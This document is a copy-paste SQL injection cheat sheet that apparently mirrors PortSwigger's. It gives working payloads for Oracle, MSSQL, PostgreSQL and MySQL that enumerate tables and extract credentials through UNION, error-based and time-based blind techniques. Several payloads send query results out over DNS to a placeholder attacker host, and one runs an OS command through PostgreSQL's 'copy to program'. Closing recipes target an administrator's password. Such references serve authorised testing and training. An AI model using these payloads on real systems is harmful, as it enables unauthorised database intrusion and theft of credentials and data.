# SQL Injection — Cheat Sheet (copy-paste payloads per engine)

Mirrors https://portswigger.net/web-security/sql-injection/cheat-sheet
Replace `YOUR-CONDITION-HERE`, `YOUR-QUERY-HERE`, `TABLE-NAME`, and `BURP-SUBDOMAIN` (your Collaborator/interactsh host).

---

## Oracle

| Purpose | Payload |
|---|---|
| String concatenation | `'foo'\|\|'bar'` |
| Substring (1-indexed) | `SUBSTR('foobar', 4, 2)` → `ba` |
| Comment | `--comment` |
| Version | `SELECT banner FROM v$version` |
| Version | `SELECT version FROM v$instance` |
| Current user | `SELECT user FROM dual` |
| List tables | `SELECT table_name FROM all_tables` |
| List columns | `SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'` |
| Conditional error | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Batched/stacked | Not supported |
| Time delay | `dbms_pipe.receive_message(('a'),10)` |
| Conditional time delay | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| DNS lookup | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| DNS lookup (privileged) | `SELECT UTL_INADDR.get_host_address('BURP-SUBDOMAIN')` |
| DNS + data exfil | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |

Note: every Oracle SELECT needs a FROM — use `FROM dual` when no table is required, e.g. `' UNION SELECT NULL FROM dual--`.

---

## Microsoft SQL Server (MSSQL)

| Purpose | Payload |
|---|---|
| String concatenation | `'foo'+'bar'` |
| Substring (1-indexed) | `SUBSTRING('foobar', 4, 2)` → `ba` |
| Comment | `--comment` or `/*comment*/` |
| Version | `SELECT @@version` |
| Current user | `SELECT user_name()` / `SELECT system_user` |
| List tables | `SELECT * FROM information_schema.tables` |
| List columns | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| Conditional error | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| Error data extraction | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` → conversion error leaking value |
| Batched/stacked | `QUERY-1; QUERY-2` |
| Time delay | `WAITFOR DELAY '0:0:10'` |
| Conditional time delay | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| DNS lookup | `exec master..xp_dirtree '//BURP-SUBDOMAIN/a'` |
| DNS + data exfil | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-SUBDOMAIN/a"')` |

---

## PostgreSQL

| Purpose | Payload |
|---|---|
| String concatenation | `'foo'\|\|'bar'` |
| Substring (1-indexed) | `SUBSTRING('foobar', 4, 2)` → `ba` |
| Comment | `--comment` or `/*comment*/` |
| Version | `SELECT version()` |
| Current user | `SELECT current_user` |
| List tables | `SELECT * FROM information_schema.tables` |
| List columns | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| Conditional error | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| Error data extraction | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → error leaking value |
| Batched/stacked | `QUERY-1; QUERY-2` |
| Time delay | `SELECT pg_sleep(10)` |
| Conditional time delay | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| DNS lookup | `copy (SELECT '') to program 'nslookup BURP-SUBDOMAIN'` |
| DNS + data exfil | `create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-SUBDOMAIN'''; execute c; end; $$ language plpgsql security definer; SELECT f();` |

---

## MySQL

| Purpose | Payload |
|---|---|
| String concatenation | `CONCAT('foo','bar')` (also `'foo' 'bar'` space-separated) |
| Substring (1-indexed) | `SUBSTRING('foobar', 4, 2)` → `ba` |
| Comment | `#comment`, `-- comment` (note the trailing space), or `/*comment*/` |
| Version | `SELECT @@version` |
| Current user | `SELECT current_user()` |
| List tables | `SELECT * FROM information_schema.tables` |
| List columns | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| Conditional error | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
| Error data extraction | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` |
| Batched/stacked | `QUERY-1; QUERY-2` (often unavailable from PHP/Python single-statement APIs) |
| Time delay | `SELECT SLEEP(10)` |
| Conditional time delay | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |
| DNS lookup (Windows) | `LOAD_FILE('\\\\BURP-SUBDOMAIN\\a')` |
| DNS lookup (Windows) | `SELECT ... INTO OUTFILE '\\\\BURP-SUBDOMAIN\\a'` |
| DNS + data exfil (Windows) | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-SUBDOMAIN\\a'` |

MySQL note: `-- ` requires the trailing space; `#` and `/* */` are unambiguous. The `--+` form (`+` decodes to space) is handy in URLs.

---

## UNION quick recipe (any engine)
```
' ORDER BY 1-- / 2-- / 3-- ...            # find column count (or UNION SELECT NULL,NULL,...)
' UNION SELECT 'a',NULL,...--             # rotate 'a' to find a string column
' UNION SELECT <version>,NULL--           # confirm + identify engine
' UNION SELECT <user>,<pass> FROM users-- # extract (concat into one string col if needed)
```

## Blind quick recipe
```
Boolean:  ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s
Error:    ' AND (SELECT CASE WHEN (cond) THEN 1/0 ELSE 'a' END)='a
Time:     ' AND IF((cond),SLEEP(5),0)#                       (MySQL)
          '; IF (cond) WAITFOR DELAY '0:0:5'--               (MSSQL)
          ' AND (SELECT CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END)--  (PostgreSQL)
OAST:     trigger DNS to BURP-SUBDOMAIN; embed (SELECT data) into the subdomain to exfil
```
Always send a false/0-delay control alongside the true payload to prove correlation.
